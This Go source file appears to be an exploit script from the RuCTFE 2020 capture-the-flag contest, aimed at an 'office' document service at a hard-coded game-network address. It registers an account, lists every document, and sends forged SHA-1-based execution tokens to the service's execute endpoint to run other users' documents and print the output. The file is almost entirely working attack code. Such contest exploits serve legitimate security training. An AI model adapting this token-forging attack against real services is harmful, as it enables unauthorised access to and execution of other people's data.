package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	pb "github.com/HackerDom/ructfe-2020/sploits/office/spl2/proto"
	"google.golang.org/protobuf/encoding/protojson"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
)

const (
	IP   = "10.60.7.2"
	Addr = IP + ":8080"
)

func RandDigest(s string) string {
	randN := rand.Uint32()
	hash := sha1.New()
	bs := make([]byte, 4)
	binary.LittleEndian.PutUint32(bs, randN)
	hash.Write([]byte(s))
	hash.Write(bs)
	digest := hash.Sum(make([]byte, 0))
	return hex.EncodeToString(digest)
}

type Jar struct {
	lk      sync.Mutex
	cookies map[string][]*http.Cookie
}

func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make(map[string][]*http.Cookie)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL.  It may or may not choose to save the cookies, depending
// on the jar's policy and implementation.
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies[u.Host] = cookies
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265.
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies[u.Host]
}

func username() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, 10)
	s := rand.New(rand.NewSource(1234))
	for i := range b {
		b[i] = letterBytes[s.Intn(len(letterBytes))]
	}
	return string(b)
}

func main() {
	jar := NewJar()
	httpClient := &http.Client{
		Jar: jar,
	}
	req := &pb.RegisterRequest{
		Name:     username(),
		Password: "asdfas",
		Bio:      "asdfasdf",
	}
	regReqJson, err := protojson.Marshal(req)
	if err != nil {
		panic(err)
	}
	_, err = httpClient.Post("http://"+Addr+"/api/users/register", "application/json", bytes.NewBuffer(regReqJson))
	if err != nil {
		panic(err)
	}
	fmt.Println(jar)
	listReq := &pb.ListDocumentsRequest{
		Offset: 0,
		Limit:  100,
	}
	listReqJson, err := protojson.Marshal(listReq)
	if err != nil {
		panic(err)
	}
	listResp, err := httpClient.Post("http://"+Addr+"/api/docs/list", "application/json", bytes.NewBuffer(listReqJson))
	if err != nil {
		panic(err)
	}
	listRespPorto := &pb.ListDocumentsResponse{}
	listBody, err := ioutil.ReadAll(listResp.Body)
	if err != nil {
		panic(err)
	}
	err = protojson.Unmarshal(listBody, listRespPorto)
	if err != nil {
		panic(err)
	}
	for _, d := range listRespPorto.Docs {
		fmt.Printf("id: %d, name: %s\n", d.Id, d.Name)
		execReq := &pb.ExecuteRequest{
			Token: RandDigest(d.Name),
			DocId: d.Id,
		}
		execReqJson, err := protojson.Marshal(execReq)
		if err != nil {
			panic(err)
		}
		execResp, err := httpClient.Post("http://"+Addr+"/api/docs/execute", "application/json", bytes.NewBuffer(execReqJson))
		if err != nil {
			panic(err)
		}
		execRespPorto := &pb.ExecuteResponse{}
		execBody, err := ioutil.ReadAll(execResp.Body)
		if err != nil {
			fmt.Println(err)
			continue
		}
		err = protojson.Unmarshal(execBody, execRespPorto)
		if err != nil {
			fmt.Println(err)
			continue
		}
		fmt.Println(execRespPorto.Executed)
	}
}
